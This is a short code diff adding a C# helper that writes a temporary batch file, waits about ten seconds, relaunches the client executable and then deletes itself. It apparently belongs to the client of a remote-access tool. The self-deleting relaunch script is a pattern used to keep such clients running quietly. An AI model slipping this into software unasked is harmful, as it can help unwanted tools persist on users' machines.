@@ -106,6 +106,29 @@ namespace xClient.Core.Helper
             }
         }
 
+        public static string CreateRestartBatch()
+        {
+            try
+            {
+                string batchFile = GetTempFilePath(".bat");
+
+                string uninstallBatch =
+                    "@echo off" + "\n" +
+                    "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                    "ping -n 10 localhost > nul" + "\n" +
+                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
+                    "del " + "\"" + batchFile + "\"";
+
+                File.WriteAllText(batchFile, uninstallBatch);
+
+                return batchFile;
+            }
+            catch (Exception)
+            {
+                return string.Empty;
+            }
+        }
+
         public static bool ClearReadOnly(string filePath)
         {
             try
